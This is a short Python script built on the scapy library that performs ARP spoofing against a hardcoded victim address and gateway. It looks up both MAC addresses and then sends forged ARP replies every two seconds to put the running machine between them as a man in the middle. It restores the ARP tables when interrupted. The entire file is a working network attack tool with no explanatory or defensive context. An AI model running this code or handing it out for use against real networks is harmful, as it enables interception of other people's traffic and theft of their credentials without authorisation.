from scapy.all import *

victimIp = '198.13.0.14'
gateIp = '198.13.13.1'

def getMac(IP):
    conf.verb = 0
    ans , unans = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(pdst = IP), timeout = 2)
    for send, receive in ans:
        return receive.src

def reARP():
    victimMac = getMac(victimIp)
    gateMac = getMac(gateIp)
    send(ARP (op = 2, pdst = gateIp, psrc = victimIp, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = victimMac), count = 10)
    send(ARP (op = 2, pdst = victimIp, psrc = gateIp, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = gateMac), count = 10)
    
def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIp, psrc = gateIp, hwdst = vm))
    send(ARP(op = 2, pdst = gateIp, psrc = victimIp, hwdst = gm))
         
def mitm():
    try:
        victimMac = getMac(victimIp)
    except Exception:
        print "[!] Couldn't find the victim MAC"
        sys.exit(1)
    try:
        gateMac = getMac(gateIp)
    except Exception:
        print "[!] Couldn;t find the gate Mac"
        sys.exit(1)
    
    while(1):
        try:
            trick(gateMac, victimMac)
            time.sleep(2)
        except KeyboardInterrupt:
            reARP()
            break
    
mitm()